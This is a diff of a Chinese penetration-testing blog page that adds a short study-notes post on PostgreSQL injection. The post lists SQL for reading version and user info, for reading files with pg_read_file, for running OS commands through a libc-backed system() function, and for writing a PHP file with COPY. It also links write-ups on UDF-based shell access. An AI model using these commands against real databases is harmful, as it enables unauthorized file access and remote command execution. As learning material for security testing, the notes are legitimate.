@@ -188,6 +188,136 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" class="post-title-link" itemprop="url">PostgreSQL注入基本操作</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-06-05 07:49:52 / 修改时间：01:11:16" itemprop="dateCreated datePublished" datetime="2021-06-05T07:49:52Z">2021-06-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Testing/" itemprop="url" rel="index"><span itemprop="name">Penetration Testing</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>对PostgreSQL的基本操作和注入不是很了解，做一些笔记。</p>
+<p>常用函数查看基本信息：</p>
+<p><strong>查看版本信息</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> version();</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/version.png" class="">
+
+<p><strong>查看当前用户</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">current_user</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_user.png" class="">
+
+<p><strong>查看启动该sesson的用户</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">session_user</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/session_user.png" class="">
+
+<p><strong>查看当前数据库</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> current_database();</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_database.png" class="">
+
+<p><strong>PostgreSQL下的IF</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CASE</span> </span><br><span class="line">      <span class="keyword">WHEN</span> condition_1  <span class="keyword">THEN</span> result_1</span><br><span class="line">      <span class="keyword">WHEN</span> condition_2  <span class="keyword">THEN</span> result_2</span><br><span class="line">      [<span class="keyword">WHEN</span> ...]</span><br><span class="line">      [<span class="keyword">ELSE</span> else_result]</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/case_when.png" class="">
+
+<p><strong>读取文件</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pg_read_file(filepath<span class="operator">+</span>filename);</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/read_file.png" class="">
+
+<p><strong>执行命令</strong></p>
+<p> Postgresql 8.2以下的版本直接调用/lib/libc.so.6或者/lib64/libc.so.6，可以执行命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">language</span> C strict;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib64/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">language</span> C strict;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是：Ubuntu中libc.so.6位于/lib/x86_64-linux-gnu目录下。高版本的系统存在安全机制无法        调用系统libc.sso.6，需要手动利用UDF进行命令执行。先查看postgresql支持的扩展语言：select *         from pg_language; Postgresql默认支持C，可以自己编译so库去创建执行命令的函数利用。</p>
+<p>当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行，具体参加下面参考文章。</p>
+<p><strong>写入文件</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span> (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;/tmp/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/save.png" class="">
+
+<p><strong>参考文章：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://docs.ioin.in/writeup/www.jianfensec.com/_postgresql_getshell_html/index.html">postgresql高版本UDF提权技巧</a></p>
+<p><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-6449.html">Hacking PostgreSQL</a></p>
+<p>[渗透中利用postgresql getshell](<a target="_blank" rel="noopener" href="https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql">https://jianfensec.com/渗透测试/渗透中利用postgresql</a> getshell/)</p>
+<p><a target="_blank" rel="noopener" href="https://pulsesecurity.co.nz/articles/postgres-sqli">SQL Injection and Postgres - An adventure to eventual RCE</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-blind">PostgreSQL injection</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -213,7 +343,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-04-22 16:54:42 / 修改时间：10:28:35" itemprop="dateCreated datePublished" datetime="2021-04-22T16:54:42Z">2021-04-22</time>
+              <time title="创建时间：2021-04-22 16:54:42 / 修改时间：10:30:16" itemprop="dateCreated datePublished" datetime="2021-04-22T16:54:42Z">2021-04-22</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -542,20 +672,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
